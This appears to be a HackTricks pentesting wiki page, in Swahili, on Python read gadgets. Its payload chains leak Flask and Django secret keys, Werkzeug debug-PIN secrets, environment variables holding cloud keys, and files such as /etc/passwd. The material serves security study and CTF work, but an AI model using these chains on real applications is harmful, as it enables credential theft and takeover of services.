# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Maelezo ya Msingi

Vulnerabilities tofauti kama vile [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) au [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) zinaweza kukuruhusu **kusoma data ya ndani ya Python lakini hazitakuruhusu kutekeleza code**. Kwa hivyo, pentester atahitaji kutumia kikamilifu ruhusa hizi za kusoma ili **kupata privileges nyeti na kuongeza ukali wa vulnerability**.

### Flask - Soma secret key

Ukurasa mkuu wa application ya Flask huenda ukawa na global object ya **`app`** ambapo **secret hii imewekwa**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Katika hali hii inawezekana kufikia object hii kwa kutumia gadget yoyote ya **access global objects** kutoka kwenye ukurasa wa [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Katika hali ambapo **vulnerability iko kwenye python file tofauti**, unahitaji gadget ya kupitia files ili kufikia file kuu na **access global object `app.secret_key`**, kisha uweze [**escalate privileges** ukijua key hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload kama huu [kutoka kwenye writeup hii](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Tumia **payload hii kusoma `app.secret_key`**. Ikiwa bug ya awali pia inakupa write primitive (kwa mfano, class pollution), njia hiyo hiyo inaweza kutumika kuibadilisha na kusaini Flask cookies zenye privileges zaidi.

### Werkzeug - machine_id na node uuid

[**Kwa kutumia payload hizi kutoka kwenye writeup hii**](https://vozec.fr/writeups/tweedle-dum-dee/) utaweza kufikia **machine_id** na node **uuid**, ambazo ni **vipande vya siri** unavyohitaji [**kutengeneza Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) na kufikia python console kwenye `/console` ikiwa **debug mode imewezeshwa**:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Kumbuka kwamba unaweza kupata **servers local path to the `app.py`** kwa kuzalisha **error** fulani kwenye ukurasa wa webu ambayo **itakupa path**.

Ikiwa vulnerability iko kwenye python file tofauti, angalia Flask trick iliyotangulia ili kufikia objects kutoka kwenye python file kuu.

### Django - SECRET_KEY and settings module

Django settings object huwekwa kwenye cache ya `sys.modules` mara tu application inapoanza. Kwa kutumia read primitives pekee, unaweza kuvuja **`SECRET_KEY`**, fallback keys, database credentials au signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Ikiwa gadget yenye udhaifu iko katika module nyingine, pitia globals kwanza:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` zina thamani sawa na `SECRET_KEY` ya sasa: bado zinathibitisha values za zamani zilizotiwa saini wakati wa rotation. Pia leak `SESSION_ENGINE` na `SESSION_SERIALIZER` ili kubaini haraka kama impact inaishia kwenye cookie forgery au ni kubwa zaidi. Kwa maelezo ya web impact, angalia [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - kusoma source code na files

Python modules zilizopakiwa kwa kawaida huhifadhi `__loader__`. File-backed loaders mara nyingi hufichua `get_source()` na `get_data()`, ambazo ni **read-only primitives** bora unapoweza tayari kufikia module object lakini huwezi kutumia `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Hii ni muhimu sana kwa kufanya **dump ya config modules, blueprints, helper files au hidden routes** na kurejesha API keys, DSNs, flag paths au gadget entry points za ziada.

Ikiwa una subclass enumeration pekee, tafuta loader kwa jina badala ya kuweka index kwa hard-code:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

Ikiwa unaweza kuunda au kufikia object ya generator/coroutine, frame yake inaweza ku-leak globals **bila kuhitaji gadget yoyote ya function `__globals__`**. Hii ni muhimu dhidi ya filters zinazozuia tu majina ya dunder na kusahau frame attributes kama `gi_frame`, `ag_frame`, `cr_frame` au `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Mara tu unapokuwa na frame globals, endelea kama ilivyo kwenye gadgets nyingine (`sys.modules`, settings objects, `os.environ`, n.k.). Sandbox escapes za hivi karibuni zinaendelea kugundua tena mbinu hii kwa sababu `gi_frame` na `f_globals` si dunder attributes na mara nyingi hustahimili deny-lists za kijinga.

### Environment variables / cloud creds kupitia loaded modules

Jails nyingi bado zina-import `os` au `sys` mahali fulani. Unaweza kutumia vibaya function yoyote inayoweza kufikiwa kupitia `__init__.__globals__` ili kuelekea kwenye module ya `os` iliyo-importiwa tayari na kudump **environment variables** zilizo na API tokens, cloud keys au flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Ikiwa subclass index imechujwa, tumia loaders:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables mara nyingi huwa siri pekee zinazohitajika kuhama kutoka read hadi full compromise (cloud IAM keys, database URLs, signing keys, n.k.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`) iliruhusu **class pollution** kupitia component requests zilizoundwa mahsusi. Kuweka property path kama `__init__.__globals__` kulimwezesha attacker kufikia component module globals na modules zozote zilizo-importiwa (k.m. `settings`, `os`, `sys`). Kutoka hapo unaweza ku-leak `SECRET_KEY`, `DATABASES` au service credentials bila code execution. Exploit chain hii inategemea kusoma pekee na hutumia dunder-gadget patterns zilezile kama hapo juu.

### Gadget collections for chaining

CTF za hivi karibuni na utafiti wa pyjail vinaonyesha read chains zinazotegemeka, zilizojengwa kwa kutumia attribute access na subclass enumeration pekee. Orodha zinazodumishwa na community kama [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) zinaorodhesha mamia ya minimal gadgets unazoweza kuchanganya ili kupita kutoka kwenye objects hadi `__globals__`, `sys.modules` na hatimaye data nyeti. Pendelea searches zinazotegemea **attribute/name** badala ya raw subclass indexes, kwa sababu nafasi ya `os._wrap_close`, `FileLoader`, `warnings.catch_warnings`, n.k. hubadilika kati ya Python versions na pamoja na libraries za ziada zilizo-importiwa.

## References

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
